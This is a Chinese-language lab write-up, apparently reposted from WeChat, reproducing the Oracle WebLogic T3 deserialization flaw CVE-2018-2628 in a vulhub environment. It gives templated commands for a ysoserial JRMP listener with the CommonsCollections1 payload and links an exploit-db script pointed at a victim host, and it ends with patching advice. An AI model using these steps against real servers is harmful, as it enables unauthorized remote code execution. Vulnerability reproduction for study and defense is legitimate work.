> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iALJhsw24JnXePnsK0NSyg)

![](https://mmbiz.qpic.cn/mmbiz_png/Ar7BeyBAjVLic0ia4vSFIKa3mGPglabHsr3w9saZKOUiaicF3nkIIVicIiaX0kMGSG7qG5iaHNHbAoXbIvLmAxf35xaxg/640?wx_fmt=png)

点击上方蓝字关注我们

0x1 前言
------

NVD:Oracle 中间件的 Oracle WebLogic Server 组件（子组件：WLS 核心组件）中的漏洞。漏洞允许未经身份验证的攻击者通过 T3 访问网络来破坏 Oracle WebLogic Server。

0x2 影响范围
--------

```
10.3.6.0、12.1.3.0、12.2.1.2 和 12.2.1.3。
```

0x3 环境准备
--------

vulhub 靶场环境：CVE-2018-2628

0x4 漏洞复现
--------

### 4.1 启动环境

访问`http://your-ip:7001/console`，初始化整个环境。

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgyph6zN5TrEf2XVkD55ibkxhD3U3FpntO0ibexO7cibAgG4PkDQ0Im3awycyib50T6OEfmPicxplhx9BxA/640?wx_fmt=png)

### 4.2 复现

首先下载 ysoserial，并启动一个 JRMP Server：

ysoserial：https://github.com/brianwrf/ysoserial/releases/tag/0.0.6-pri-beta

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1
```

其中，`[command]`即为我想执行的命令，而`[listen port]`是 JRMP Server 监听的端口。

![](https://mmbiz.qpic.cn/mmbiz_jpg/auiclCmzibWgyph6zN5TrEf2XVkD55ibkxhiaS2RRia0sUzNMjofpmJh8iasjG7FOpdfQIlhTIiaFVXCeqVK2rnic1bWUQ/640?wx_fmt=jpeg)

利用该 exp 进行攻击

https://www.exploit-db.com/exploits/44553

使用 exp 脚本，向目标 Weblogic（`http://your-ip:7001`）发送数据包：

```
python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
```

  `[victim ip]`和`[victim port]`是目标 weblogic 的 IP 和端口，`[path to ysoserial]`是本地 ysoserial 的路径，`[JRMPListener ip]`和`[JRMPListener port]`第一步中启动 JRMP Server 的 IP 地址和端口。`[JRMPClient]`是执行 JRMPClient 的类，可选的值是`JRMPClient`或`JRMPClient2`。

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgyph6zN5TrEf2XVkD55ibkxhMhS5Ct6GUDjlRUBsgyFhXlg4sicgSHepBQvNf0s9n55L1vCbibbRB8Jg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgyph6zN5TrEf2XVkD55ibkxhUJVD2CqmoBWXStVenN3hKvLiakgNbmyC2dcGKKicbEdSuB9X5jJcemQg/640?wx_fmt=png)

exploit.py 执行完成后，执行`docker-compose exec weblogic bash`进入容器中

查看容器 id：`docker ps -a`

列出容器:`docker ps`

使用容器 ID 进入容器

```
docker exec -it 容器ID /bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgyph6zN5TrEf2XVkD55ibkxhW0xb36tYgGw7n5lyWHzrHYh0avtISUfdGsMvd68lyBBFLJchAPkk2w/640?wx_fmt=png)

0x5 修复建议
--------

建议用户时刻关注官方通知的补丁，及时打补丁，禁用 T3 协议，禁止 T3 端口对外开放。

![](https://mmbiz.qpic.cn/mmbiz_gif/6aVaON9Kibf7jNIAOgqwdCv2J77riaDsoMDSpLqoaUiao8aD9r3FwP0gFU2Psuqv6SgVAPhib8hibvO8CaEM8wu1Arw/640?wx_fmt=gif)